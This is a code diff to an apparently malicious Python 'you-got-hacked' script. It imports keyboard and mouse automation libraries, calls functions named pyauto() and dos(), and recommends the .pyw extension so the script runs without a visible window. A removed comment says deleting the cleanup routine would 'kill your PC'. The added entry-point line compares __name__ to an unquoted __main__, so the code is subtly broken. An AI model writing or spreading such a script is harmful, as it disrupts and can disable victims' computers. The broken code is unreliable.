@@ -1,3 +1,10 @@
+# -------------------------------------------------
+# python code                                     -
+# python version > python 3.6.x                   -
+# need to pip install pyautogui and and keyboard  -
+# type Python file: .pyw                          -
+# -------------------------------------------------
+
 import keyboard as kb
 import pyautogui as py
 import os, math, sys
@@ -25,13 +32,14 @@ def main():
     pyauto()
     dos()
 
+if __name__ == __main__:
+    main()
 
 # =========================================== clean up ===========================================
-# ==                             you can delete it if you want to kill your PC                  ==
-# ========================================== good luck ===========================================
 
 
 def clean():
     os.remove(f'{os.path.expanduser("~")}{os.sep}you-got-hacked.virabyte')
     sys.exit(0)
     os._exit(0)
+ 
